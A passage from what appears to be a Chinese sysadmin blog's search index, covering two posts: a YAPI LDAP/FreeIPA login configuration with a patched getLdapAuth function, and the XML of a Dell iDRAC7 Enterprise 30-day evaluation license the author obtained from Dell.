\u0026#34;@bybon.cn\u0026#34;, \u0026#34;emailKey\u0026#34;: \u0026#34;mail\u0026#34;, \u0026#34;usernameKey\u0026#34;: \u0026#34;displayName\u0026#34; } 这里需要修改一下，vi my-yapi/vendors/server/controllers/user.js\n理由如下，登录的时候，yapi的逻辑是先判断用户邮件，把邮件中的用户名摘出来，然后加上配置中的邮件域。\n这个逻辑在ldap中就不对了，改成如下格式，这样直接输入ldap用户名就可以登录了\n/** * ldap登录 * @interface /user/login_by_ldap * @method * @category user * @foldnumber 10 * @param {String} email email名称，不能为空 * @param {String} password 密码，不能为空 * @returns {Object} * */ async getLdapAuth(ctx) { try { const { email, password } = ctx.request.body; //no const username = email.split(/\\@/g)[0]; //1 const { info: ldapInfo } = await ldap.ldapQuery(email, password); //2 const emailPrefix = email.split(/\\@/g)[0]; //3 const emailPostfix = yapi.WEBCONFIG.ldapLogin.emailPostfix; //zrr const emailPrefix = email.split(/\\@/g)[0]; const emailPostfix = yapi.WEBCONFIG.ldapLogin.emailPostfix; const { info: ldapInfo } = await ldap.ldapQuery( (emailPostfix ? emailPrefix + emailPostfix : email),password); //zrr const emailParams = ldapInfo[yapi.WEBCONFIG.ldapLogin.emailKey || \u0026#39;mail\u0026#39;] || (emailPostfix ? emailPrefix + emailPostfix : email); const username = ldapInfo[yapi.WEBCONFIG.ldapLogin.usernameKey] || emailPrefix; ","permalink":"https://rendoumi.com/posts/20230412-freeipa_yapi/","summary":"\u003cp\u003eFreeipa接入Yapi.\u003c/p\u003e\n\u003cp\u003evi my-api/config.json\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e...\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    \u003cspan class=\"s2\"\u003e\u0026#34;ldapLogin\u0026#34;\u003c/span\u003e: \u003cspan class=\"o\"\u003e{\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e      \u003cspan class=\"s2\"\u003e\u0026#34;enable\u0026#34;\u003c/span\u003e: true,\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e      \u003cspan class=\"s2\"\u003e\u0026#34;server\u0026#34;\u003c/span\u003e: \u003cspan class=\"s2\"\u003e\u0026#34;ldap://ldap.bybon.cn\u0026#34;\u003c/span\u003e,\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e      \u003cspan class=\"s2\"\u003e\u0026#34;baseDn\u0026#34;\u003c/span\u003e: \u003cspan class=\"s2\"\u003e\u0026#34;uid=manager,cn=users,cn=accounts,dc=bybon,dc=cn\u0026#34;\u003c/span\u003e,\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e      \u003cspan class=\"s2\"\u003e\u0026#34;bindPassword\u0026#34;\u003c/span\u003e: \u003cspan class=\"s2\"\u003e\u0026#34;xxxxxxxx\u0026#34;\u003c/span\u003e,\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e      \u003cspan class=\"s2\"\u003e\u0026#34;searchDn\u0026#34;\u003c/span\u003e: \u003cspan class=\"s2\"\u003e\u0026#34;cn=users,cn=accounts,dc=bybon,dc=cn\u0026#34;\u003c/span\u003e,\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e      \u003cspan class=\"s2\"\u003e\u0026#34;searchStandard\u0026#34;\u003c/span\u003e: \u003cspan class=\"s2\"\u003e\u0026#34;mail\u0026#34;\u003c/span\u003e,\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e      \u003cspan class=\"s2\"\u003e\u0026#34;emailPostfix\u0026#34;\u003c/span\u003e: \u003cspan class=\"s2\"\u003e\u0026#34;@bybon.cn\u0026#34;\u003c/span\u003e,\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e      \u003cspan class=\"s2\"\u003e\u0026#34;emailKey\u0026#34;\u003c/span\u003e: \u003cspan class=\"s2\"\u003e\u0026#34;mail\u0026#34;\u003c/span\u003e,\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e      \u003cspan class=\"s2\"\u003e\u0026#34;usernameKey\u0026#34;\u003c/span\u003e: \u003cspan class=\"s2\"\u003e\u0026#34;displayName\u0026#34;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e   \u003cspan class=\"o\"\u003e}\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cp\u003e这里需要修改一下，vi my-yapi/vendors/server/controllers/user.js\u003c/p\u003e\n\u003cp\u003e理由如下，登录的时候，yapi的逻辑是先判断用户邮件，把邮件中的用户名摘出来，然后加上配置中的邮件域。\u003c/p\u003e\n\u003cp\u003e这个逻辑在ldap中就不对了，改成如下格式，这样直接输入ldap用户名就可以登录了\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e  /**\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e   * ldap登录\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e   * @interface /user/login_by_ldap\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e   * @method\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e   * @category user\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e   * @foldnumber \u003cspan class=\"m\"\u003e10\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e   * @param \u003cspan class=\"o\"\u003e{\u003c/span\u003eString\u003cspan class=\"o\"\u003e}\u003c/span\u003e email email名称，不能为空\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e   * @param  \u003cspan class=\"o\"\u003e{\u003c/span\u003eString\u003cspan class=\"o\"\u003e}\u003c/span\u003e password 密码，不能为空\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e   * @returns \u003cspan class=\"o\"\u003e{\u003c/span\u003eObject\u003cspan class=\"o\"\u003e}\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e   *\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e   */\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e  async getLdapAuth\u003cspan class=\"o\"\u003e(\u003c/span\u003ectx\u003cspan class=\"o\"\u003e)\u003c/span\u003e \u003cspan class=\"o\"\u003e{\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    try \u003cspan class=\"o\"\u003e{\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e      const \u003cspan class=\"o\"\u003e{\u003c/span\u003e email, password \u003cspan class=\"o\"\u003e}\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e ctx.request.body\u003cspan class=\"p\"\u003e;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e      //no const \u003cspan class=\"nv\"\u003eusername\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e email.split\u003cspan class=\"o\"\u003e(\u003c/span\u003e/\u003cspan class=\"se\"\u003e\\@\u003c/span\u003e/g\u003cspan class=\"o\"\u003e)[\u003c/span\u003e0\u003cspan class=\"o\"\u003e]\u003c/span\u003e\u003cspan class=\"p\"\u003e;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e      //1 const \u003cspan class=\"o\"\u003e{\u003c/span\u003e info: ldapInfo \u003cspan class=\"o\"\u003e}\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e await ldap.ldapQuery\u003cspan class=\"o\"\u003e(\u003c/span\u003eemail, password\u003cspan class=\"o\"\u003e)\u003c/span\u003e\u003cspan class=\"p\"\u003e;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e      //2 const \u003cspan class=\"nv\"\u003eemailPrefix\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e email.split\u003cspan class=\"o\"\u003e(\u003c/span\u003e/\u003cspan class=\"se\"\u003e\\@\u003c/span\u003e/g\u003cspan class=\"o\"\u003e)[\u003c/span\u003e0\u003cspan class=\"o\"\u003e]\u003c/span\u003e\u003cspan class=\"p\"\u003e;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e      //3 const \u003cspan class=\"nv\"\u003eemailPostfix\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e yapi.WEBCONFIG.ldapLogin.emailPostfix\u003cspan class=\"p\"\u003e;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e      //zrr\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e      const \u003cspan class=\"nv\"\u003eemailPrefix\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e email.split\u003cspan class=\"o\"\u003e(\u003c/span\u003e/\u003cspan class=\"se\"\u003e\\@\u003c/span\u003e/g\u003cspan class=\"o\"\u003e)[\u003c/span\u003e0\u003cspan class=\"o\"\u003e]\u003c/span\u003e\u003cspan class=\"p\"\u003e;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e      const \u003cspan class=\"nv\"\u003eemailPostfix\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e yapi.WEBCONFIG.ldapLogin.emailPostfix\u003cspan class=\"p\"\u003e;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e      const \u003cspan class=\"o\"\u003e{\u003c/span\u003e info: ldapInfo \u003cspan class=\"o\"\u003e}\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e await ldap.ldapQuery\u003cspan class=\"o\"\u003e(\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e        \u003cspan class=\"o\"\u003e(\u003c/span\u003eemailPostfix ? emailPrefix + emailPostfix : email\u003cspan class=\"o\"\u003e)\u003c/span\u003e,password\u003cspan class=\"o\"\u003e)\u003c/span\u003e\u003cspan class=\"p\"\u003e;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e      //zrr\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e      const \u003cspan class=\"nv\"\u003eemailParams\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e        ldapInfo\u003cspan class=\"o\"\u003e[\u003c/span\u003eyapi.WEBCONFIG.ldapLogin.emailKey \u003cspan class=\"o\"\u003e||\u003c/span\u003e \u003cspan class=\"s1\"\u003e\u0026#39;mail\u0026#39;\u003c/span\u003e\u003cspan class=\"o\"\u003e]\u003c/span\u003e \u003cspan class=\"o\"\u003e||\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e        \u003cspan class=\"o\"\u003e(\u003c/span\u003eemailPostfix ? emailPrefix + emailPostfix : email\u003cspan class=\"o\"\u003e)\u003c/span\u003e\u003cspan class=\"p\"\u003e;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e      const \u003cspan class=\"nv\"\u003eusername\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e ldapInfo\u003cspan class=\"o\"\u003e[\u003c/span\u003eyapi.WEBCONFIG.ldapLogin.usernameKey\u003cspan class=\"o\"\u003e]\u003c/span\u003e \u003cspan class=\"o\"\u003e||\u003c/span\u003e emailPrefix\u003cspan class=\"p\"\u003e;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e","title":"Yapi集成进freeIPA进行统一认证"},{"content":"新公司的dell服务器idrac居然没有license，无法远程，找了dell要了一个临时license给装上，其实装好系统就不会太用到了，记录一下，以后备用。\n\u0026lt;?xml version=\u0026#34;1.0\u0026#34;?\u0026gt; \u0026lt;!--Copyright (c) 2010-2011 Dell Inc. All Rights Reserved.--\u0026gt; \u0026lt;lns:LicenseClass xmlns:ds=\u0026#34;http://www.w3.org/2000/09/xmldsig#\u0026#34; xmlns:xsi=\u0026#34;http://www.w3.org/2001/XMLSchema-instance\u0026#34; xmlns:lns=\u0026#34;http://www.dell.com/2011/12G/licensing\u0026#34;\u0026gt; \u0026lt;lns:LicenseData\u0026gt; \u0026lt;lns:Schema lns:Vendor=\u0026#34;Dell\u0026#34; lns:ID=\u0026#34;iDRAC\u0026#34; lns:maxDepth=\u0026#34;255\u0026#34; lns:SchemaVersion=\u0026#34;2.0\u0026#34;/\u0026gt; \u0026lt;lns:TransferableLicense\u0026gt;false\u0026lt;/lns:TransferableLicense\u0026gt; \u0026lt;lns:UTCdateSold\u0026gt;2011-09-20T16:10:37Z\u0026lt;/lns:UTCdateSold\u0026gt; \u0026lt;lns:EntitlementID\u0026gt;56r8irR7fV5w3MIxlJUFL9Ph_Lori_Matthews\u0026lt;/lns:EntitlementID\u0026gt; \u0026lt;lns:DeviceClass lns:ID=\u0026#34;iDRAC\u0026#34;/\u0026gt; \u0026lt;lns:ProductDescription\u0026gt; \u0026lt;lns:lang_en\u0026gt;iDRAC7 Enterprise Evaluation License\u0026lt;/lns:lang_en\u0026gt; \u0026lt;lns:lang_es\u0026gt;iDRAC7 Enterprise Evaluation License\u0026lt;/lns:lang_es\u0026gt; \u0026lt;lns:lang_fr\u0026gt;iDRAC7 Enterprise Evaluation License\u0026lt;/lns:lang_fr\u0026gt; \u0026lt;lns:lang_de\u0026gt;iDRAC7 Enterprise Evaluation License\u0026lt;/lns:lang_de\u0026gt; \u0026lt;lns:lang_it\u0026gt;iDRAC7 Enterprise Evaluation License\u0026lt;/lns:lang_it\u0026gt; \u0026lt;lns:lang_ja\u0026gt;iDRAC7 Enterprise Evaluation License\u0026lt;/lns:lang_ja\u0026gt; \u0026lt;lns:lang_zh\u0026gt;iDRAC7 Enterprise Evaluation License\u0026lt;/lns:lang_zh\u0026gt; \u0026lt;/lns:ProductDescription\u0026gt; \u0026lt;lns:LicenseTerm\u0026gt; \u0026lt;lns:Evaluation lns:Duration=\u0026#34;P30D\u0026#34;/\u0026gt; \u0026lt;/lns:LicenseTerm\u0026gt; \u0026lt;lns:DeviceInfo lns:ID=\u0026#34;1\u0026#34; lns:VendorID=\u0026#34;0x1912\u0026#34; lns:DeviceID=\u0026#34;0x0011\u0026#34;/\u0026gt; \u0026lt;lns:Feature lns:ID=\u0026#34;1\u0026#34; lns:Description=\u0026#34;License Management\u0026#34; lns:Enabled=\u0026#34;true\u0026#34;/\u0026gt; \u0026lt;lns:Feature lns:ID=\u0026#34;2\u0026#34; lns:Description=\u0026#34;RACADM\u0026#34; lns:Enabled=\u0026#34;true\u0026#34;/\u0026gt; \u0026lt;lns:Feature lns:ID=\u0026#34;3\u0026#34; lns:Description=\u0026#34;WSMAN\u0026#34; lns:Enabled=\u0026#34;true\u0026#34;/\u0026gt; \u0026lt;lns:Feature lns:ID=\u0026#34;4\u0026#34; lns:Description=\u0026#34;SNMP\u0026#34; lns:Enabled=\u0026#34;true\u0026#34;/\u0026gt; \u0026lt;lns:Feature lns:ID=\u0026#34;5\u0026#34; lns:Description=\u0026#34;Auto Discovery\u0026#34; lns:Enabled=\u0026#34;true\u0026#34;/\u0026gt; \u0026lt;lns:Feature lns:ID=\u0026#34;6\u0026#34; lns:Description=\u0026#34;USC Firmware Update\u0026#34; lns:Enabled=\u0026#34;true\u0026#34;/\u0026gt; \u0026lt;lns:Feature lns:ID=\u0026#34;7\u0026#34; lns:Description=\u0026#34;Update Package\u0026#34; lns:Enabled=\u0026#34;true\u0026#34;/\u0026gt; \u0026lt;lns:Feature lns:ID=\u0026#34;8\u0026#34; lns:Description=\u0026#34;USC Operating System Deployment\u0026#34; lns:Enabled=\u0026#34;true\u0026#34;/\u0026gt; \u0026lt;lns:Feature lns:ID=\u0026#34;9\u0026#34; lns:Description=\u0026#34;USC Device Configuration\u0026#34; lns:Enabled=\u0026#34;true\u0026#34;/\u0026gt; \u0026lt;lns:Feature lns:ID=\u0026#34;10\u0026#34; lns:Description=\u0026#34;USC Diagnostics\u0026#34; lns:Enabled=\u0026#34;true\u0026#34;/\u0026gt; \u0026lt;lns:Feature lns:ID=\u0026#34;11\u0026#34; lns:Description=\u0026#34;Power Budget\u0026#34; lns:Enabled=\u0026#34;true\u0026#34;/\u0026gt; \u0026lt;lns:Feature lns:ID=\u0026#34;12\u0026#34; lns:Description=\u0026#34;Power Monitoring\u0026#34; lns:Enabled=\u0026#34;true\u0026#34;/\u0026gt; \u0026lt;lns:Feature lns:ID=\u0026#34;13\u0026#34; lns:Description=\u0026#34;Virtual Media\u0026#34; lns:Enabled=\u0026#34;true\u0026#34;/\u0026gt; \u0026lt;lns:Feature lns:ID=\u0026#34;14\u0026#34; lns:Description=\u0026#34;Telnet\u0026#34; lns:Enabled=\u0026#34;true\u0026#34;/\u0026gt; \u0026lt;lns:Feature lns:ID=\u0026#34;15\u0026#34; lns:Description=\u0026#34;SMASH CLP\u0026#34; lns:Enabled=\u0026#34;true\u0026#34;/\u0026gt; \u0026lt;lns:Feature lns:ID=\u0026#34;16\u0026#34; lns:Description=\u0026#34;IPv6\u0026#34; lns:Enabled=\u0026#34;true\u0026#34;/\u0026gt; \u0026lt;lns:Feature lns:ID=\u0026#34;17\u0026#34; lns:Description=\u0026#34;Dynamic DNS\u0026#34; lns:Enabled=\u0026#34;true\u0026#34;/\u0026gt; \u0026lt;lns:Feature lns:ID=\u0026#34;18\u0026#34; lns:Description=\u0026#34;Dedicated NIC\u0026#34; lns:Enabled=\u0026#34;true\u0026#34;/\u0026gt; \u0026lt;lns:Feature lns:ID=\u0026#34;19\u0026#34; lns:Description=\u0026#34;Directory Services\u0026#34; lns:Enabled=\u0026#34;true\u0026#34;/\u0026gt; \u0026lt;lns:Feature lns:ID=\u0026#34;20\u0026#34; lns:Description=\u0026#34;Two-Factor Authentication\u0026#34; lns:Enabled=\u0026#34;true\u0026#34;/\u0026gt; \u0026lt;lns:Feature lns:ID=\u0026#34;21\u0026#34; lns:Description=\u0026#34;Single Sign-On\u0026#34; lns:Enabled=\u0026#34;true\u0026#34;/\u0026gt; \u0026lt;lns:Feature lns:ID=\u0026#34;22\u0026#34; lns:Description=\u0026#34;PK Authentication\u0026#34; lns:Enabled=\u0026#34;true\u0026#34;/\u0026gt; \u0026lt;lns:Feature lns:ID=\u0026#34;23\u0026#34; lns:Description=\u0026#34;Crash Screen Capture\u0026#34; lns:Enabled=\u0026#34;true\u0026#34;/\u0026gt; \u0026lt;lns:Feature lns:ID=\u0026#34;24\u0026#34; lns:Description=\u0026#34;Crash Video Capture\u0026#34; lns:Enabled=\u0026#34;true\u0026#34;/\u0026gt; \u0026lt;lns:Feature lns:ID=\u0026#34;25\u0026#34; lns:Description=\u0026#34;Boot Capture\u0026#34; lns:Enabled=\u0026#34;true\u0026#34;/\u0026gt; \u0026lt;lns:Feature lns:ID=\u0026#34;26\u0026#34; lns:Description=\u0026#34;Virtual Console\u0026#34; lns:Enabled=\u0026#34;true\u0026#34;/\u0026gt; \u0026lt;lns:Feature lns:ID=\u0026#34;27\u0026#34; lns:Description=\u0026#34;Virtual Flash Partitions\u0026#34; lns:Enabled=\u0026#34;true\u0026#34;/\u0026gt; \u0026lt;lns:Feature lns:ID=\u0026#34;28\u0026#34; lns:Description=\u0026#34;Console Collaboration\u0026#34; lns:Enabled=\u0026#34;true\u0026#34;/\u0026gt; \u0026lt;lns:Feature lns:ID=\u0026#34;29\u0026#34; lns:Description=\u0026#34;Device Monitoring\u0026#34; lns:Enabled=\u0026#34;true\u0026#34;/\u0026gt; \u0026lt;lns:Feature lns:ID=\u0026#34;30\u0026#34; lns:Description=\u0026#34;Remote Inventory\u0026#34; lns:Enabled=\u0026#34;true\u0026#34;/\u0026gt; \u0026lt;lns:Feature lns:ID=\u0026#34;31\u0026#34; lns:Description=\u0026#34;Storage Monitoring\u0026#34; lns:Enabled=\u0026#34;true\u0026#34;/\u0026gt; \u0026lt;lns:Feature lns:ID=\u0026#34;32\u0026#34; lns:Description=\u0026#34;Remote Firmware Update\u0026#34; lns:Enabled=\u0026#34;true\u0026#34;/\u0026gt; \u0026lt;lns:Feature lns:ID=\u0026#34;33\u0026#34; lns:Description=\u0026#34;Remote Firmware Configuration\u0026#34; lns:Enabled=\u0026#34;true\u0026#34;/\u0026gt; \u0026lt;lns:Feature lns:ID=\u0026#34;34\u0026#34; lns:Description=\u0026#34;Remote Inventory Export\u0026#34; lns:Enabled=\u0026#34;true\u0026#34;/\u0026gt; \u0026lt;lns:Feature lns:ID=\u0026#34;35\u0026#34; lns:Description=\u0026#34;Remote Operating System Deployment\u0026#34; lns:Enabled=\u0026#34;true\u0026#34;/\u0026gt; \u0026lt;lns:Feature lns:ID=\u0026#34;36\u0026#34; lns:Description=\u0026#34;Backup and Restore\u0026#34; lns:Enabled=\u0026#34;true\u0026#34;/\u0026gt; \u0026lt;lns:Feature lns:ID=\u0026#34;37\u0026#34; lns:Description=\u0026#34;Part Replacement\u0026#34; lns:Enabled=\u0026#34;true\u0026#34;/\u0026gt; \u0026lt;lns:Feature lns:ID=\u0026#34;38\u0026#34; lns:Description=\u0026#34;SSH\u0026#34; lns:Enabled=\u0026#34;true\u0026#34;/\u0026gt; \u0026lt;lns:Feature lns:ID=\u0026#34;39\u0026#34; lns:Description=\u0026#34;Remote File Share\u0026#34; lns:Enabled=\u0026#34;true\u0026#34;/\u0026gt; \u0026lt;lns:Feature lns:ID=\u0026#34;40\u0026#34; lns:Description=\u0026#34;Virtual Folders\u0026#34; lns:Enabled=\u0026#34;true\u0026#34;/\u0026gt; \u0026lt;lns:Feature lns:ID=\u0026#34;41\u0026#34; lns:Description=\u0026#34;Web GUI\u0026#34; lns:Enabled=\u0026#34;true\u0026#34;/\u0026gt; \u0026lt;lns:Feature lns:ID=\u0026#34;42\u0026#34; lns:Description=\u0026#34;Network Time Protocol\u0026#34; lns:Enabled=\u0026#34;true\u0026#34;/\u0026gt; \u0026lt;lns:Feature lns:ID=\u0026#34;43\u0026#34; lns:Description=\u0026#34;Email Alerts\u0026#34; lns:Enabled=\u0026#34;true\u0026#34;/\u0026gt; \u0026lt;lns:Feature lns:ID=\u0026#34;44\u0026#34; lns:Description=\u0026#34;Security Lockout\u0026#34; lns:Enabled=\u0026#34;true\u0026#34;/\u0026gt; \u0026lt;lns:Feature lns:ID=\u0026#34;45\u0026#34; lns:Description=\u0026#34;Remote Syslog\u0026#34; lns:Enabled=\u0026#34;true\u0026#34;/\u0026gt; \u0026lt;lns:Feature lns:ID=\u0026#34;253\u0026#34; lns:Description=\u0026#34;Integrated Dell Remote Access Controller 7 Enterprise\u0026#34; lns:Enabled=\u0026#34;true\u0026#34;/\u0026gt; \u0026lt;/lns:LicenseData\u0026gt; \u0026lt;dsig:Signature xmlns:dsig=\u0026#34;http://www.w3.org/2000/09/xmldsig#\u0026#34;\u0026gt; \u0026lt;dsig:SignedInfo\u0026gt; \u0026lt;dsig:CanonicalizationMethod Algorithm=\u0026#34;http://www.w3.org/2001/10/xml-exc-c14n#\u0026#34;/\u0026gt; \u0026lt;dsig:SignatureMethod Algorithm=\u0026#34;http://www.w3.org/2000/09/xmldsig#rsa-sha1\u0026#34;/\u0026gt; \u0026lt;dsig:Reference URI=\u0026#34;\u0026#34;\u0026gt; \u0026lt;dsig:Transforms\u0026gt; \u0026lt;dsig:Transform Algorithm=\u0026#34;http://www.w3.org/2000/09/xmldsig#enveloped-signature\u0026#34;/\u0026gt; \u0026lt;/dsig:Transforms\u0026gt; \u0026lt;dsig:DigestMethod Algorithm=\u0026#34;http://www.w3.org/2000/09/xmldsig#sha1\u0026#34;/\u0026gt; \u0026lt;dsig:DigestValue\u0026gt;DrtnjP0vUsyT+18jazjmiaGrvc0=\u0026lt;/dsig:DigestValue\u0026gt; \u0026lt;/dsig:Reference\u0026gt; \u0026lt;/dsig:SignedInfo\u0026gt; \u0026lt;dsig:SignatureValue\u0026gt;Qg4Omx1ZGrVllUPbg/X25aJxK5qlNCF/G04NLwXhbmpqoplSRkCCUgb+6TvVz9b3 Ut7sSa/WjA0mv+mbcqIENTAnpveIkIOQPR3mdjCBwX2cLYieV9nOIGobxqHU7o97 QjbSAkmTHcRo0PI6mP8tc7Od4WNWMZ48rrUBeOrVOr1EZeptPUbeaSofy4nvlzbC pcpzZLbjAITT157r9KiFe9joG2hCEClrQPO0ScXHgKXrAWrQE9wX7e2De4uCvJwI hGWpJzDQNJJZbsWhDoZJn/59G/KRjzxIHIzIpUt1XPPIGHl5yMXDaRFcIMES0RuJ SWZS8tt9E001Fr/8/jQNgA==\u0026lt;/dsig:SignatureValue\u0026gt; \u0026lt;dsig:KeyInfo\u0026gt; \u0026lt;dsig:X509Data\u0026gt; \u0026lt;dsig:X509Certificate\u0026gt;MIIDTjCCAjagAwIBAgIBATANBgkqhkiG9w0BAQUFADBRMRMwEQYDVQQKEwpEZWxs LCBJbmMuMSEwHwYDVQQLExhFbWJlZGRlZCBMaWNlbnNlIE1hbmFnZXIxFzAVBgNV BAMTDkNBIENlcnRpZmljYXRlMB4XDTEwMDEwMTAwMDAwMFoXDTM1MTIzMTIzNTk1 OVowVjETMBEGA1UEChMKRGVsbCwgSW5jLjEhMB8GA1UECxMYRW1iZWRkZWQgTGlj ZW5zZSBNYW5hZ2VyMRwwGgYDVQQDExNTaWduaW5nIENlcnRpZmljYXRlMIIBIjAN BgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEAqbRo2DZtkjxl5YtqD5ePYdzrWbkU YQJwVaWYe1tE7ZAdou5TLTsjPnaa1cLcPTexn+cq8YjukIVwkwJP7yJ5GkrYGUnf 0Q6unWWgwcgTStlpflz31e8AbxXqNYZEFvEktojYS0kAfiYES+H02GUU5PtV7B9Y BbtZEowU2DPuqRGG1FF8mAsp1vojcbQGx+nS2Of47oQJRrJlh28COXyf2w/+IRAz RmeYin+9pisfrT9fmlUtxa7sAAV/KZFRx8ED31YiktXgI/u/PNnHlchiCMaL6pzA HMBf115O7A2y6IZ9sXUHvH8V9QnDkWT1XHMn8GCW8HXOA5zA232OxiaRmQIDAQAB oywwKjAJBgNVHRMEAjAAMB0GA1UdDgQWBBQAoZ7yMjDHMAFtmmmO/zyz3BJ6hjAN BgkqhkiG9w0BAQUFAAOCAQEAHHgoOg57S+lAEejahdBE1HMwe6BF3b9bzUMCynn9 7buXa3cnRFO3H3674WKU6nBjv4nkT3qMyXwgi7MvXcu69msK4eM6QA8XeC7G1rD+ 2bb/ENR9R9Zo0BWLym/ij8uUA/BzX8hnbzWxN82+FMdY9WD4fJAJwJ5ZPEbU1Vfy 7wOWosHgDPXjeAhlhkxDQi6vlRTJdfED6tBY7iGD4AQXfzrHzAZpZlIvKbM2c54B 65wMSlqfEWMBDhT5qcwGCq82hmi7/sCtu9Z20g2s9F0fp4XlGX8L7l0hCa46zjay 37GffYsScEDFg/DmkIpcXnGzyx8l1msLzpj8Gt4zHhPlgA==\u0026lt;/dsig:X509Certificate\u0026gt; \u0026lt;/dsig:X509Data\u0026gt; \u0026lt;/dsig:KeyInfo\u0026gt; \u0026lt;/dsig:Signature\u0026gt;\u0026lt;/lns:LicenseClass\u0026gt; 